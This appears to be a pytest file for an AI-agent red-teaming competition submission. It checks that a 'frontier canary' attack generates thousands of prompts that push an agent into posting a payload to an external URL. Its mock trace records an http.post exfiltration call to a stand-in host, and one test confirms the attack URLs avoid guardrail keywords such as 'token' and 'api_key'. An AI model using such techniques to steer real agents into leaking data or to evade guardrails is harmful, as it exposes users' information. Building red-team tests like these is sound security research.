"""Static/mechanical checks for the frozen public-frontier canary."""

from __future__ import annotations

import importlib.util
from pathlib import Path

from aicomp_sdk.attacks import AttackRunConfig


MODULE_PATH = (
    Path(__file__).resolve().parents[1]
    / "submissions"
    / "ASUB-20260825-001-frontier-canary"
    / "attack.py"
)
SPEC = importlib.util.spec_from_file_location("agentsec_frontier_canary", MODULE_PATH)
assert SPEC is not None and SPEC.loader is not None
CANARY = importlib.util.module_from_spec(SPEC)
SPEC.loader.exec_module(CANARY)


class _AlwaysFiresEnv:
    def __init__(self) -> None:
        self.last_message = ""

    def reset(self) -> None:
        self.last_message = ""

    def interact(self, message: str, max_tool_hops: int | None = None) -> None:
        del max_tool_hops
        self.last_message = message

    def export_trace_dict(self) -> dict:
        return {
            "user_messages": [self.last_message],
            "tool_events": [
                {
                    "name": "http.post",
                    "ok": True,
                    "args": {"url": "http://aa.co", "data": CANARY.PAYLOAD},
                    "side_effect": "SHARE",
                    "scope": "external",
                    "source": "tool",
                    "output": "ok",
                    "error": "",
                }
            ],
        }


def test_canary_static_portfolio_respects_replay_limits() -> None:
    candidates = CANARY._emit_static(2_000)
    assert len(candidates) == 2_000

    messages = [candidate.user_messages for candidate in candidates]
    assert all(len(chain) == 1 for chain in messages)
    assert all(len(chain[0]) <= 2_000 for chain in messages)
    assert len({chain[0] for chain in messages}) == 2_000


def test_canary_domain_labels_are_unique_and_guardrail_clean() -> None:
    urls = [CANARY._url(index) for index in range(2_000)]
    assert len(set(urls)) == 2_000

    dangerous = (
        "secret",
        "password",
        "token",
        "key",
        "credential",
        "private",
        "confidential",
        "api_key",
    )
    assert all(not any(word in url.lower() for word in dangerous) for url in urls)


def test_canary_none_env_fallback_is_valid() -> None:
    attack = CANARY.AttackAlgorithm()
    findings = attack.run(None, AttackRunConfig(time_budget_s=1.0, max_steps=1))
    assert len(findings) == CANARY.FALLBACK_N
    assert all(len(candidate.user_messages) == 1 for candidate in findings)


def test_canary_tiny_budget_returns_only_live_verified_candidate() -> None:
    attack = CANARY.AttackAlgorithm()
    env = _AlwaysFiresEnv()
    findings = attack.run(
        env,
        AttackRunConfig(time_budget_s=1.0, max_steps=1, max_tool_hops=8),
    )

    # Warm-up is intentionally not returned; the first full-hop classifier is.
    assert len(findings) == 1
    assert CANARY.PAYLOAD in findings[0].user_messages[0]
    assert "http.post" in findings[0].user_messages[0]
